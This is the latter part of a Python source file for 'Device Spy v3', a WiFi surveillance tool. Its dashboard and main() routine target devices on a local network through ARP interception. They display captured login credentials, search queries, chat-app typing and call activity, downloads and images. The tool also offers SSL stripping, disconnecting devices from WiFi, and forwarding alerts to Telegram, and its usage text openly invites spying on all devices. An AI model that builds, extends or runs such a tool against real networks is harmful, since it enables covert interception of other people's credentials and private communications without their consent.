        layout["alerts_mini"].update(self._alerts_panel())
        layout["app_intel"].update(self._app_intel_panel())
        layout["device_info"].update(self._device_profile_panel())
        layout["sites"].update(self._sites_panel())
        layout["connections"].update(self._conn_panel())

        return layout

    def _header(self):
        stats = self.spy.get_stats()
        now = datetime.now().strftime("%H:%M:%S")
        uptime = str(datetime.now() - stats["start_time"]).split(".")[0] if stats["start_time"] else "0:00:00"
        targets = ", ".join(self.spy.target_ips)
        alert_stats = self.spy.alerts.get_stats()
        cred_count = len(self.spy.credential_sniffer.get_credentials())
        dl_stats = self.spy.file_tracker.get_stats()
        chats = self.spy.chat_detector.get_active_chats()
        chat_count = sum(1 for c in chats.values() if c.get("active"))

        h = Text()
        h.append(" 🕵️ DEVICE SPY v3 ", style="bold bright_white on dark_red")
        h.append(f" ⏱{now} ", style="bright_white")
        h.append(f" ⬆{uptime} ", style="dim")
        # Show device names instead of bare IPs
        target_labels = []
        for ip in self.spy.target_ips:
            name = self._get_device_name(ip)
            if name != ip:
                target_labels.append(f"{name} [{ip}]")
            else:
                target_labels.append(ip)
        h.append(f" 🎯{', '.join(target_labels)} ", style="bold bright_yellow")
        h.append(f" 📦{stats['total_packets']:,} ", style="bright_cyan")
        h.append(f" DNS:{stats['dns_packets']} ", style="bright_cyan")
        h.append(f" 🔒:{stats['https_packets']} ", style="bright_green")
        h.append(f" 🌐:{stats['http_packets']} ", style="bright_yellow")
        # New module stats
        if alert_stats["total"] > 0:
            h.append(f" 🚨{alert_stats['total']} ", style="bold bright_red")
        if cred_count > 0:
            h.append(f" 🔑{cred_count} ", style="bold bright_red")
        if dl_stats["total"] > 0:
            h.append(f" 📁{dl_stats['total']} ", style="bright_yellow")
        if chat_count > 0:
            h.append(f" 💬{chat_count} ", style="bright_green")
        h.append(f" 💾{self._fmt_bytes(stats['total_bytes'])} ", style="dim")

        return Panel(h, style="bright_red", box=HEAVY)

    def _packet_feed(self):
        """Live packet capture feed with clickable links."""
        table = Table(
            box=SIMPLE, expand=True, padding=(0, 1),
            show_edge=False, header_style="bold bright_white",
        )
        table.add_column("Time", width=12, style="dim")
        table.add_column("Proto", width=5, justify="center")
        table.add_column("Destination", width=22, overflow="ellipsis")
        table.add_column("Details (click links!)", overflow="ellipsis", ratio=2)

        recent = self.spy.get_all_recent(limit=22)
        for pkt in reversed(recent):
            proto = pkt["proto"]
            proto_styles = {"DNS": "bright_cyan", "HTTPS": "bright_green", "HTTP": "bright_yellow", "TLS": "bright_green"}
            pt = Text(proto, style=proto_styles.get(proto, "dim"))

            # Destination
            dst = pkt["dst"]

            # Details — clickable
            detail = Text()
            if pkt.get("search_query"):
                detail.append('🔎 "', style="bright_magenta")
                detail.append(pkt["search_query"][:40], style="bold bright_magenta")
                detail.append('"', style="bright_magenta")
            elif pkt.get("url"):
                url = pkt["url"]
                detail.append(f"🔗 {url[:55]}", style=f"link {url} underline bright_cyan")
            elif pkt.get("domain"):
                domain = pkt["domain"]
                url = f"https://{domain}/"
                detail.append(f"🔗 {domain}", style=f"link {url} underline bright_cyan")
                if proto == "DNS":
                    detail.append(f" [{pkt.get('raw_info', '')[-20:] if pkt.get('raw_info') else ''}]", style="dim")
            else:
                detail.append(dst, style="dim")

            if pkt.get("referer"):
                ref = pkt["referer"].split("/")[2] if "://" in pkt["referer"] else pkt["referer"]
                detail.append(f" ← {ref[:12]}", style="dim italic")

            table.add_row(pkt["time"], pt, dst[:22], detail)

        if not recent:
            table.add_row("--", Text("...", style="dim"), "--",
                         Text("[dim]Intercepting packets... waiting for target activity[/]"))

        return Panel(table, title="📦 Live Packet Capture — Click links to visit",
                     title_align="left", border_style="bright_red", box=ROUNDED)

    def _dns_panel(self):
        """DNS queries panel."""
        table = Table(box=MINIMAL, expand=True, padding=(0, 0),
                      header_style="bold bright_white", show_edge=False)
        table.add_column("Time", width=8, style="dim")
        table.add_column("Domain (click to visit)", overflow="ellipsis", ratio=2)
        table.add_column("Type", width=5, style="dim")

        for ip in self.spy.target_ips:
            dns_entries = self.spy.get_dns_log(ip, limit=12)
            for d in reversed(dns_entries):
                domain = d["domain"]
                url = f"https://{domain}/"
                link = Text()
                link.append(f"🔗 {domain[:30]}", style=f"link {url} underline bright_cyan")
                table.add_row(d["time"], link, d.get("type", "A"))

        if not any(self.spy.get_dns_log(ip) for ip in self.spy.target_ips):
            table.add_row("--", Text("[dim]Waiting for DNS queries...[/]"), "--")

        return Panel(table, title="🔍 DNS Lookups", title_align="left",
                     border_style="bright_cyan", box=ROUNDED)

    def _sites_panel(self):
        """Most visited websites."""
        table = Table(box=MINIMAL, expand=True, padding=(0, 0),
                      header_style="bold bright_white")
        table.add_column("Website (click)", overflow="ellipsis", ratio=2)
        table.add_column("Hits", width=8, justify="right")
        table.add_column("BW", width=8, style="dim")

        for ip in self.spy.target_ips:
            sites = self.spy.get_websites(ip, limit=12)
            bw = self.spy.get_bandwidth(ip)

            for domain, count in sites:
                url = f"https://{domain}/"
                link = Text()
                link.append(f"🔗 {domain[:25]}", style=f"link {url} underline bright_cyan")
                bar = "█" * min(count, 5)
                table.add_row(link, f"{bar}{count}", "")

            if not sites:
                table.add_row(Text("[dim]Waiting...[/]"), "-", "-")

            # Bandwidth footer
            bw_text = Text()
            bw_text.append(f"\n ⬇{self._fmt_bytes(bw['in'])} ⬆{self._fmt_bytes(bw['out'])} Total:{self._fmt_bytes(bw['total'])}", style="dim")
            table.add_row(bw_text, "", "")

        return Panel(table, title="🌐 Visited Sites — Click to Open",
                     title_align="left", border_style="bright_green", box=ROUNDED)

    def _app_intel_panel(self):
        """Deep App Intelligence panel — real-time app activity."""
        content = Text()

        for ip in self.spy.target_ips:
            # Device status line
            status = self.spy.app_intel.get_device_status(ip)
            dev_name = self._get_device_name(ip)
            label = f"{dev_name} [{ip}]" if dev_name != ip else ip
            content.append(f" {label}: ", style="bold bright_white")
            status_text = status.get("status", "Idle")
            if "⚨️" in status_text or "TYPING" in status_text:
                content.append(f"{status_text}\n", style="bold bright_yellow blink")
            elif "📹" in status_text or "📞" in status_text or "CALL" in status_text:
                content.append(f"{status_text}\n", style="bold bright_red")
            else:
                content.append(f"{status_text}\n", style="dim")

            # Active apps
            active = self.spy.app_intel.get_active_apps(ip)
            if active:
                for app_name, info in active.items():
                    icon = info.get("icon", "📱")
                    content.append(f"  {icon} ", style="")
                    content.append(f"{app_name}", style="bold bright_cyan")
                    content.append(f" ({info['duration']}) ", style="dim")

                    # Status indicator
                    if info.get("is_typing"):
                        content.append("⌨️ TYPING... ", style="bold bright_yellow")
                    if info.get("is_call"):
                        call_icon = "📹" if info.get("is_video") else "📞"
                        content.append(f"{call_icon} IN CALL ", style="bold bright_red")

                    # Message counts
                    if info.get("msgs_sent", 0) > 0 or info.get("msgs_recv", 0) > 0:
                        content.append(f"\u2709{info['msgs_sent']}", style="bright_green")
                        content.append(f"/✉{info['msgs_recv']} ", style="bright_yellow")
                    if info.get("media", 0) > 0:
                        content.append(f"📸{info['media']} ", style="bright_magenta")
                    content.append("\n")
            else:
                content.append("  [dim]💤 No app activity yet...[/]\n")

        # Event feed (last 5)
        events = self.spy.app_intel.get_events(limit=5)
        if events:
            content.append("\n 📝 Recent Events:\n", style="bold bright_white")
            for ev in reversed(events):
                icon = ev.get("icon", "📱")
                etype = ev.get("type", "")
                estyle = "dim"
                if "TYPING" in etype:
                    estyle = "bright_yellow"
                elif "CALL" in etype:
                    estyle = "bright_red"
                elif "MEDIA" in etype:
                    estyle = "bright_magenta"
                elif "MSG" in etype:
                    estyle = "bright_green"

                content.append(f"  [{ev['time']}] ", style="dim")
                content.append(f"{icon} {ev['description'][:45]}\n", style=estyle)

        # Search queries (keep from old panel)
        for ip in self.spy.target_ips:
            searches = self.spy.get_searches(ip, limit=3)
            if searches:
                content.append("\n 🔎 Searches:\n", style="bold bright_magenta")
                for s in reversed(searches):
                    content.append(f"  [{s['time']}] ", style="dim")
                    content.append(f'"{s["query"]}"\n', style="bold bright_magenta")
                break

        return Panel(content, title="🔬 App Intelligence (LIVE)",
                     title_align="left", border_style="bright_cyan", box=ROUNDED)

    def _chat_search_panel(self):
        """Combined chat detection + search queries panel."""
        content = Text()

        # Chat apps detected
        chats = self.spy.chat_detector.get_active_chats()
        has_chats = False
        for ip, info in chats.items():
            if info.get("apps"):
                has_chats = True
                content.append(" 💬 ", style="bright_green")
                content.append(f"{ip}: ", style="dim")
                for app in info["apps"]:
                    content.append(f"[{app}] ", style="bold bright_green")
                active = "🟢" if info.get("active") else "⚪"
                content.append(f"{active}\n")

        if has_chats:
            content.append("\n")

        # Search queries
        content.append(" 🔎 Searches:\n", style="bold bright_magenta")
        for ip in self.spy.target_ips:
            searches = self.spy.get_searches(ip, limit=4)
            for s in reversed(searches):
                content.append(f"  [{s['time']}] ", style="dim")
                content.append(f'"{s["query"]}"\n', style="bold bright_magenta")

        has_searches = any(self.spy.get_searches(ip) for ip in self.spy.target_ips)
        if not has_searches and not has_chats:
            content.append("  [dim]Chat apps & searches will appear...[/]\n")

        # Recent downloads
        downloads = self.spy.file_tracker.get_downloads(limit=3)
        if downloads:
            content.append("\n 📁 Downloads:\n", style="bold bright_yellow")
            for dl in reversed(downloads):
                content.append(f"  {dl['type']}: ", style="bright_yellow")
                url = dl.get('url', '')
                fname = dl.get('filename', '?')[:20]
                content.append(f"🔗 {fname}", style=f"link {url} underline bright_cyan")
                content.append("\n")

        return Panel(content, title="💬 Chat & Searches & Downloads",
                     title_align="left", border_style="bright_magenta", box=ROUNDED)

    def _alerts_panel(self):
        """Alerts panel."""
        alerts = self.spy.alerts.get_alerts(limit=8)
        content = Text()

        if alerts:
            sev_icon = {"low": "ℹ️", "medium": "⚠️", "high": "🚨", "critical": "🔴"}
            sev_style = {"low": "dim", "medium": "bright_yellow", "high": "bright_red", "critical": "bold bright_red"}
            for a in reversed(alerts):
                icon = sev_icon.get(a["severity"], "⚠️")
                style = sev_style.get(a["severity"], "bright_yellow")
                content.append(f" {icon} [{a['time']}] ", style="dim")
                content.append(f"{a['rule']}", style=style)
                content.append(f" — {a['device']}\n", style="dim")
        else:
            content.append("  [dim]No alerts yet. Monitoring for:[/]\n")
            content.append("  [dim]Adult, Banking, Downloads, VPN, Hacking...[/]\n")

        # Captured credentials
        creds = self.spy.credential_sniffer.get_credentials(limit=3)
        if creds:
            content.append("\n 🔑 Captured Credentials:\n", style="bold bright_red")
            for c in reversed(creds):
                content.append(f"  [{c['time']}] ", style="dim")
                content.append(f"{c['host']} ", style="bright_cyan")
                if c.get('username'):
                    content.append(f"user:{c['username']}", style="bold bright_yellow")
                if c.get('password'):
                    content.append(f" pass:{c['password'][:8]}***", style="bold bright_red")
                content.append("\n")

        return Panel(content, title="🚨 Alerts & Credentials",
                     title_align="left", border_style="bright_red", box=ROUNDED)

    def _device_profile_panel(self):
        """Device fingerprinting profile."""
        content = Text()
        for ip in self.spy.target_ips:
            profile = self.spy.fingerprinter.get_profile(ip)
            bw = self.spy.get_bandwidth(ip)
            dev_name = self._get_device_name(ip)

            content.append(f" 🎯 {ip}", style="bold bright_yellow")
            if dev_name != ip:
                content.append(f" — {dev_name}", style="bold bright_white")
            content.append("\n")

            # Show scanner hostname/vendor
            for device in self.scanner.get_devices():
                if device.ip == ip:
                    if device.hostname and device.hostname != "Unknown":
                        content.append(f"  🏷️  {device.hostname}\n", style="bright_green")
                    if device.vendor and device.vendor != "Unknown Vendor":
                        content.append(f"  🏭 {device.vendor}\n", style="bright_cyan")
                    content.append(f"  📌 MAC: {device.mac}\n", style="dim")
                    break

            if profile:
                if profile.device_brand or profile.device_model:
                    content.append(f"  📱 ", style="dim")
                    content.append(f"{profile.device_brand} {profile.device_model}\n", style="bold bright_white")
                if profile.os_name != "Unknown":
                    content.append(f"  💻 {profile.os_name} {profile.os_version}\n", style="bright_cyan")
                if profile.browser:
                    content.append(f"  🌐 {profile.browser} {profile.browser_version}\n", style="bright_green")
                if profile.device_type != "Unknown":
                    content.append(f"  📟 Type: {profile.device_type}\n", style="dim")
            else:
                content.append("  [dim]Fingerprinting... (needs HTTP traffic)[/]\n")

            # Bandwidth
            content.append(f"  ⬇{self._fmt_bytes(bw['in'])} ⬆{self._fmt_bytes(bw['out'])}\n", style="dim")
            content.append("\n")

        return Panel(content, title="📱 Device Profiles",
                     title_align="left", border_style="bright_cyan", box=ROUNDED)

    def _conn_panel(self):
        content = Text()
        for ip in self.spy.target_ips:
            conns = self.spy.get_connections(ip, limit=6)
            for (dst_ip, dst_port, proto), count in conns:
                content.append(f" {proto:<5} ", style="bright_yellow")
                content.append(f"{dst_ip}:{dst_port}", style="bright_white")
                content.append(f" ×{count}\n", style="dim")

        if not content.plain.strip():
            content.append(" [dim]Connections will appear here...[/]\n")

        # Image captures
        images = self.spy.image_capture.get_images(limit=3)
        if images:
            content.append("\n 🖼️ Images:\n", style="bold bright_cyan")
            for img in reversed(images):
                url = img.get('url', '')
                fname = img.get('filename', '?')[:20]
                content.append(f"  🔗 {fname}", style=f"link {url} underline bright_cyan")
                content.append("\n")

        return Panel(content, title="🔌 Connections & Images",
                     title_align="left", border_style="bright_yellow", box=ROUNDED)

    def _footer(self):
        f = Text()
        f.append(" [Ctrl+C]", style="bold bright_red")
        f.append(" Stop ", style="bright_white")
        f.append("│", style="dim")
        f.append(" ARP:", style="dim")
        f.append("ON ", style="bold bright_green")

        # Module status icons
        alert_count = self.spy.alerts.get_stats()["total"]
        if alert_count > 0:
            f.append(f"│ 🚨{alert_count} ", style="bright_red")

        cred_count = len(self.spy.credential_sniffer.get_credentials())
        if cred_count > 0:
            f.append(f"│ 🔑{cred_count} ", style="bright_red")

        f.append("│", style="dim")
        f.append(f" Log:{os.path.basename(self.spy._log_file or '')} ", style="dim")
        f.append("│", style="dim")
        f.append(" 🔗 Click links! ", style="bold bright_cyan")

        return Panel(f, style="bright_red", box=HEAVY)

    @staticmethod
    def _fmt_bytes(b):
        if b < 1024: return f"{b}B"
        elif b < 1048576: return f"{b/1024:.1f}KB"
        elif b < 1073741824: return f"{b/1048576:.1f}MB"
        else: return f"{b/1073741824:.2f}GB"


# ═══════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════

def main():
    console = Console()

    # Banner
    console.print("""[bold bright_red]
 ██████╗ ███████╗██╗   ██╗██╗ ██████╗███████╗    ███████╗██████╗ ██╗   ██╗
 ██╔══██╗██╔════╝██║   ██║██║██╔════╝██╔════╝    ██╔════╝██╔══██╗╚██╗ ██╔╝
 ██║  ██║█████╗  ██║   ██║██║██║     █████╗      ███████╗██████╔╝ ╚████╔╝ 
 ██║  ██║██╔══╝  ╚██╗ ██╔╝██║██║     ██╔══╝      ╚════██║██╔═══╝   ╚██╔╝  
 ██████╔╝███████╗ ╚████╔╝ ██║╚██████╗███████╗    ███████║██║        ██║   
 ╚═════╝ ╚══════╝  ╚═══╝  ╚═╝ ╚═════╝╚══════╝    ╚══════╝╚═╝        ╚═╝   
[/][bold bright_white]   v3 — Full Intelligence Suite (18 Modules)[/]
[dim]  Fingerprinting │ Alerts │ Credentials │ Downloads │ Chat │ WiFi Blocker │ BT Scanner │ Web UI[/]
""")

    # Check root
    if os.geteuid() != 0:
        console.print(Panel(
            "[bold bright_red]ERROR: Root required![/]\n\n"
            "Run: [bold bright_cyan]sudo python3 device_spy.py[/]",
            border_style="bright_red", box=ROUNDED,
        ))
        sys.exit(1)

    # Parse args
    parser = argparse.ArgumentParser(
        description="Device Spy v2 — Full WiFi intelligence suite",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 device_spy.py                  # Interactive (select targets)
  sudo python3 device_spy.py --all             # Spy on ALL devices
  sudo python3 device_spy.py -t 192.168.1.50   # Target specific device
  sudo python3 device_spy.py --all --web       # + Web dashboard at :8080
  sudo python3 device_spy.py --all --telegram BOT_TOKEN CHAT_ID

Modules:
  📱 Device Fingerprinting — Identify OS, browser, device model
  🚨 Real-Time Alerts — Adult, banking, hacking, downloads, custom rules
  🔑 Credential Sniffer — Capture HTTP login forms
  📁 File/Download Tracker — PDFs, APKs, videos, images
  💬 Chat Detector — WhatsApp, Telegram, Discord, Signal, Slack
  🕐 Browsing Timeline — Chronological per-device history
  🌍 Web Dashboard — Interactive map at http://localhost:8080
  ⛔ Network Control — Kick, throttle, block sites
  🔐 SSL Strip — Downgrade HTTPS to HTTP (--sslstrip)
  📊 Session Recording — Save to .pcap (Wireshark-compatible)
  🛡️ Deauth Monitor — Detect attacks on your network
  📡 IoT Discovery — Find smart home devices (mDNS/SSDP)
  🧠 AI Analysis — Behavioral profiling & anomaly detection
  🔬 Deep App Intel — Detect typing, calls, media transfers
  🚫 WiFi Blocker — Disconnect devices from WiFi (--block IP)
  📶 Bluetooth Scanner — Find nearby BT & BLE devices
        """
    )
    parser.add_argument("-i", "--interface", help="WiFi interface", default=None)
    parser.add_argument("-t", "--target", action="append", help="Target IP(s)", default=None)
    parser.add_argument("--all", action="store_true", help="Spy on ALL devices")
    parser.add_argument("--web", action="store_true", help="Launch web dashboard on :8080")
    parser.add_argument("--web-port", type=int, default=8080, help="Web dashboard port")
    parser.add_argument("--sslstrip", action="store_true", help="Enable SSL stripping (DANGEROUS)")
    parser.add_argument("--pcap", action="store_true", default=True, help="Save session to .pcap")
    parser.add_argument("--no-pcap", action="store_true", help="Disable PCAP recording")
    parser.add_argument("--telegram", nargs=2, metavar=("TOKEN", "CHAT_ID"),
                        help="Telegram push notifications")
    parser.add_argument("--block", action="append", metavar="IP",
                        help="Block/disconnect device(s) from WiFi")
    args = parser.parse_args()

    # Setup scanner
    scanner = NetworkScanner(interface=args.interface)
    console.print(f"  [bright_green]✓[/] Interface: [bold]{scanner.interface}[/]")
    console.print(f"  [bright_green]✓[/] Gateway:   [bold]{scanner.gateway_ip}[/]")
    console.print(f"  [bright_green]✓[/] Local IP:  [bold]{scanner.local_ip}[/]")
    console.print()

    # Discover devices
    if not args.target:
        # Save terminal settings BEFORE Scapy scanning (srp corrupts them)
        import termios, tty
        try:
            _stdin_fd = sys.stdin.fileno()
            _saved_term = termios.tcgetattr(_stdin_fd)
        except Exception:
            _saved_term = None
            _stdin_fd = None

        console.print("[bright_yellow]⟐ Scanning network for devices (multi-layer scan)...[/]")
        devices = scanner.scan_once()

        # Give hostname resolution a moment to finish
        console.print("[dim]  Resolving hostnames...[/]")
        time.sleep(2)

        # Second pass to catch any stragglers
        devices = scanner.scan_once()
        time.sleep(1)

        # Restore terminal settings after Scapy scan
        if _saved_term is not None:
            try:
                termios.tcsetattr(_stdin_fd, termios.TCSADRAIN, _saved_term)
            except Exception:
                pass

        if not devices:
            console.print("[bright_red]No devices found! Check your WiFi connection.[/]")
            sys.exit(1)

        console.print(f"[bright_green]  ✓ Found {len(devices)} device(s)[/]\n")

        # Show device selection
        table = Table(title="📡 Devices on Network", box=ROUNDED,
                      border_style="bright_blue", header_style="bold bright_white on dark_blue")
        table.add_column("#", width=3, justify="center")
        table.add_column("IP Address", width=15, style="bright_white")
        table.add_column("MAC Address", width=17, style="dim")
        table.add_column("Hostname", width=20, style="bright_cyan", overflow="ellipsis")
        table.add_column("Vendor", width=15, style="bright_yellow", overflow="ellipsis")
        table.add_column("Status", width=8, justify="center")

        selectable = []
        # Sort by IP octet for nicer display
        sorted_devs = sorted(devices, key=lambda d: tuple(int(x) for x in d.ip.split(".")))
        for dev in sorted_devs:
            if dev.ip == scanner.local_ip or dev.ip == scanner.gateway_ip:
                continue
            selectable.append(dev)
            status = "[bright_green]●[/]" if dev.is_online else "[dim]○[/]"
            hostname = dev.hostname if dev.hostname not in ("Unknown", "Resolving...") else "[dim]—[/]"
            vendor = dev.vendor if dev.vendor != "Unknown Vendor" else "[dim]—[/]"
            table.add_row(str(len(selectable)), dev.ip, dev.mac,
                         hostname, vendor, status)

        console.print(table)
        console.print()

        if args.all:
            targets = [d.ip for d in selectable]
            console.print(f"[bright_yellow]⟐ Targeting ALL {len(targets)} devices[/]")
        else:
            console.print("[bold bright_cyan]Select device(s) to spy on:[/]")
            console.print("[dim]Enter numbers separated by commas (e.g., 1,3,5) or 'all'[/]\n")

            # Force-restore terminal before prompting (safety net)
            if _saved_term is not None:
                try:
                    termios.tcsetattr(_stdin_fd, termios.TCSANOW, _saved_term)
                except Exception:
                    pass

            selection = Prompt.ask("🎯 Target", default="all")

            if selection.lower() == "all":
                targets = [d.ip for d in selectable]
            else:
                indices = [int(x.strip()) for x in selection.split(",") if x.strip().isdigit()]
                targets = [selectable[i-1].ip for i in indices if 0 < i <= len(selectable)]

            if not targets:
                console.print("[bright_red]No valid targets selected![/]")
                sys.exit(1)
    else:
        targets = args.target

    console.print()
    console.print(Panel(
        f"[bold bright_yellow]🎯 Targets: {', '.join(targets)}[/]\n"
        f"[dim]Setting up ARP interception + intelligence modules...[/]",
        border_style="bright_yellow", box=ROUNDED,
    ))
    console.print()

    # Create spy with all modules
    telegram_token = args.telegram[0] if args.telegram else None
    telegram_chat_id = args.telegram[1] if args.telegram else None

    spy = DeviceSpy(
        interface=scanner.interface,
        gateway_ip=scanner.gateway_ip,
        local_ip=scanner.local_ip,
        target_ips=targets,
        telegram_token=telegram_token,
        telegram_chat_id=telegram_chat_id,
    )

    if not spy.setup(console):
        console.print("[bright_red]Setup failed![/]")
        sys.exit(1)

    # Print module status
    console.print()
    console.print("  [bright_green]✓[/] 📱 Device Fingerprinting")
    console.print("  [bright_green]✓[/] 🚨 Alert System (adult, banking, hacking, VPN)")
    console.print("  [bright_green]✓[/] 🔑 Credential Sniffer (HTTP POST forms)")
    console.print("  [bright_green]✓[/] 📁 File Download Tracker")
    console.print("  [bright_green]✓[/] 🖼️  Image Capture")
    console.print("  [bright_green]✓[/] 💬 Chat App Detector")
    console.print("  [bright_green]✓[/] 🕐 Browsing Timeline")
    console.print("  [bright_green]✓[/] 🌍 Geo Mapper")
    console.print("  [bright_green]✓[/] ⛔ Network Control (kick/throttle/block)")
    console.print("  [bright_green]✓[/] 🛡️  Deauth Monitor (ARP spoof detection)")
    console.print("  [bright_green]✓[/] 📡 IoT Device Discovery (mDNS/SSDP)")
    console.print("  [bright_green]✓[/] 🧠 AI Browsing Analysis")
    console.print("  [bright_green]✓[/] 🔬 Deep App Intelligence (typing, calls, media)")
    console.print("  [bright_green]✓[/] 🚫 WiFi Blocker (disconnect devices)")
    bt_status = "✓" if spy.bt_scanner.is_available else "⚠"
    bt_color = "bright_green" if spy.bt_scanner.is_available else "bright_yellow"
    console.print(f"  [{bt_color}]{bt_status}[/] 📶 Bluetooth Scanner {'(active)' if spy.bt_scanner.is_available else '(no adapter)'}")
    enable_pcap = args.pcap and not args.no_pcap
    if enable_pcap:
        console.print("  [bright_green]✓[/] 📊 Session Recording (.pcap + HTML report)")
    if args.sslstrip:
        console.print("  [bright_yellow]⚠[/] 🔐 SSL Strip [bold bright_red]ENABLED[/] (HTTPS downgrade!)")
    if telegram_token:
        console.print("  [bright_green]✓[/] 📲 Telegram Push Notifications")

    # Start web dashboard
    web_dash = None
    if args.web:
        console.print(f"  [bright_green]✓[/] 🌐 Web Dashboard: [bold bright_cyan]http://localhost:{args.web_port}[/]")
        web_dash = WebDashboard(
            spy=spy,
            scanner=scanner,
            geo_mapper=spy.geo_mapper,
            fingerprinter=spy.fingerprinter,
            alert_system=spy.alerts,
            interceptors={
                "credential_sniffer": spy.credential_sniffer,
                "file_tracker": spy.file_tracker,
                "image_capture": spy.image_capture,
                "chat_detector": spy.chat_detector,
                "timeline": spy.timeline,
            },
            controller=spy.controller,
            wifi_blocker=spy.wifi_blocker,
            port=args.web_port,
        )
        web_dash.start()

    console.print()
    console.print("[bright_green]⟐ Starting device spy...[/]")
    spy.start(
        enable_sslstrip=args.sslstrip,
        enable_pcap=enable_pcap,
    )

    console.print("[bright_green]✓ All systems active! Launching dashboard...[/]\n")

    if args.block:
        for ip in args.block:
            spy.wifi_blocker.block_device(target_ip=ip)
            console.print(f"[bold bright_red]🚫 Activated WiFi Blocker for: {ip}[/]")

    if args.web:
        console.print(f"[bold bright_cyan]  🌐 Open http://localhost:{args.web_port} in your browser for the web dashboard![/]")
    time.sleep(2)

    # Run terminal dashboard
    dashboard = SpyDashboard(spy, scanner)
    try:
        dashboard.run()
    finally:
        console.print("\n[bright_yellow]⟐ Stopping spy & restoring ARP tables...[/]")
        spy.stop()
        spy.controller.cleanup()
        spy.sslstrip.stop()
        spy.deauth_monitor.stop()
        spy.device_discovery.stop()
        spy.recorder.stop()
        spy.app_intel.stop()
        spy.wifi_blocker.stop()
        spy.bt_scanner.stop()
        if web_dash:
            web_dash.stop()

        # Save timeline
        # Helper to resolve device name for exit prints
        def _dev_label(ip):
            # Try fingerprinter first
            profile = spy.fingerprinter.get_profile(ip)
            fp_name = ""
            if profile:
                brand = getattr(profile, 'device_brand', '') or ''
                model = getattr(profile, 'device_model', '') or ''
                if brand or model:
                    fp_name = f"{brand} {model}".strip()

            for dev in scanner.get_devices():
                if dev.ip == ip:
                    parts = []
                    if fp_name:
                        parts.append(fp_name)
                    elif dev.hostname and dev.hostname != "Unknown":
                        parts.append(dev.hostname)
                    if dev.vendor and dev.vendor != "Unknown Vendor":
                        parts.append(f"({dev.vendor})")
                    if parts:
                        return f"{' '.join(parts)} [{ip}]"
            return ip

        for ip in targets:
            tl = spy.timeline.export_text(ip)
            log_file = spy._log_file or "spy_log.json"
            tl_file = log_file.replace(".json", f"_timeline_{ip.replace('.', '-')}.txt")
            try:
                with open(tl_file, "w") as f:
                    f.write(tl)
                console.print(f"[bright_green]✓ Timeline saved: {tl_file}[/]")
            except Exception:
                pass

        # Generate HTML report
        if enable_pcap:
            report = spy.recorder.export_html_report()
            if report:
                console.print(f"[bright_green]✓ HTML report: {report}[/]")
            pcap_stats = spy.recorder.get_stats()
            if pcap_stats.get("pcap_file"):
                console.print(f"[bright_green]✓ PCAP saved: {pcap_stats['pcap_file']}[/]")

        # Print AI analysis summary
        for ip in targets:
            profile = spy.analyzer.get_profile(ip)
            if profile and profile.get("summary") != "Insufficient data":
                console.print(f"[bold bright_cyan]🧠 AI Profile for {_dev_label(ip)}: {profile['summary']}[/]")

        # Print IoT devices found
        iot = spy.device_discovery.get_iot_devices()
        if iot:
            console.print(f"[bright_green]📡 IoT Devices Found: {len(iot)}[/]")
            for ip, d in iot.items():
                console.print(f"  {d.get('brand','')} {d.get('type','')} at {ip}")

        # Print app usage summary
        for ip in targets:
            msg_stats = spy.app_intel.get_message_stats(ip)
            if msg_stats:
                console.print(f"\n[bold bright_cyan]🔬 App Intel for {_dev_label(ip)}:[/]")
                for app_name, stats in msg_stats.items():
                    icon = stats.get('icon', '📱')
                    sent = stats.get('sent', 0)
                    recv = stats.get('received', 0)
                    media = stats.get('media', 0)
                    console.print(f"  {icon} {app_name}: ~{sent} sent, ~{recv} received, {media} media")
            summary = spy.app_intel.get_summary(ip)
            if summary and "No app activity" not in summary:
                console.print(f"[dim]{summary}[/]")

        # Print security alerts
        attacks = spy.deauth_monitor.get_attacks()
        if attacks:
            console.print(f"[bold bright_red]🛡️  {len(attacks)} SECURITY ALERTS detected during session![/]")

        # Print Bluetooth scan results
        bt_devices = spy.bt_scanner.get_devices()
        if bt_devices:
            console.print(f"\n[bold bright_magenta]📶 Bluetooth: {len(bt_devices)} devices discovered[/]")
            for mac, dev in list(bt_devices.items())[:10]:
                console.print(f"  {dev['device_type']} {dev['name']} ({dev['manufacturer']}) [{mac}]")

        console.print(f"[bright_green]✓ Log saved to: {spy._log_file}[/]")
        console.print("[bright_green]✓ Network restored. All modules stopped. Done![/]")


if __name__ == "__main__":
    main()
